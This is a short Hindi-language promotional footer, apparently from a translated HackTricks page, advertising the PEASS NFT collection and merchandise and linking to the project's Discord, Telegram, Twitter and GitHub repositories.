* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को फॉलो करें।**

</details>
